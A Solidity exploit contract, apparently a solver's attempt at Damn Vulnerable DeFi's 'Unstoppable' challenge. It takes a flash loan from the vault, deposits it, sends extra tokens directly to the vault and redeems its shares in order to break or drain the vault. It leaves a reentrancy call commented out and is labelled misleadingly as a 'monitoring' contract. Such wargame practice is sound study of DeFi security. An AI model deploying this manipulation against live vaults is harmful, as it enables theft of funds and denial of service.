// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import {Owned} from "solmate/auth/Owned.sol";
import {UnstoppableVault, ERC20} from "../unstoppable/UnstoppableVault.sol";

/**
 * @notice Permissioned contract for on-chain monitoring of the vault's flashloan feature.  
 */
contract UnstoppableHack is Owned, IERC3156FlashBorrower {
    UnstoppableVault private immutable vault;
    address asset;

    constructor(address _vault) Owned(msg.sender) {
        vault = UnstoppableVault(_vault);
    }

    function onFlashLoan(address initiator, address token, uint256 amount, uint256 fee, bytes calldata)
        external
        returns (bytes32)
    {

        ERC20(token).approve(address(vault), type(uint256).max);
        ERC20(vault).approve(address(vault), type(uint256).max);

        // if(counter < 10){
        //     vault.flashLoan(this, asset, amount, bytes(""));
        // }

        // deposit the amount of the flash loan to the vault
        uint256 shares = vault.deposit(amount, address(this));

        // send some tokens to the vault
        uint256 balance = ERC20(token).balanceOf(address(this));
        ERC20(token).transfer(address(vault), balance);

        // redeem from the vault
        vault.redeem(shares, address(this), address(this));
        
        // profit?

        return keccak256("IERC3156FlashBorrower.onFlashLoan");
    }

    function startFlashLoan(uint256 amount) external onlyOwner {
        require(amount > 0);

        asset = address(vault.asset());

        vault.flashLoan(this, asset, amount, bytes(""));
    }
}
